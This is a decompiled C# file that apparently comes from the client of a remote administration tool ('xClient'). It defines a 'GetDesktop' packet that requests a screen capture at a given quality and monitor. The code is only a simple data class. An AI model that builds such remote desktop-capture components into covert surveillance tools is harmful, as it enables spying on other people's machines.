using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x02000090 RID: 144
	[Serializable]
	public class GetDesktop : IPacket
	{
		// Token: 0x17000093 RID: 147
		// (get) Token: 0x060003C0 RID: 960 RVA: 0x00003DF0 File Offset: 0x00001FF0
		// (set) Token: 0x060003C1 RID: 961 RVA: 0x00003DF8 File Offset: 0x00001FF8
		public int Quality { get; set; }

		// Token: 0x17000094 RID: 148
		// (get) Token: 0x060003C2 RID: 962 RVA: 0x00003E01 File Offset: 0x00002001
		// (set) Token: 0x060003C3 RID: 963 RVA: 0x00003E09 File Offset: 0x00002009
		public int Monitor { get; set; }

		// Token: 0x060003C4 RID: 964 RVA: 0x000021D4 File Offset: 0x000003D4
		public GetDesktop()
		{
		}

		// Token: 0x060003C5 RID: 965 RVA: 0x00003E12 File Offset: 0x00002012
		public GetDesktop(int quality, int monitor)
		{
			this.Quality = quality;
			this.Monitor = monitor;
		}

		// Token: 0x060003C6 RID: 966 RVA: 0x00003E28 File Offset: 0x00002028
		public void Execute(Client client)
		{
			client.Send<GetDesktop>(this);
		}
	}
}
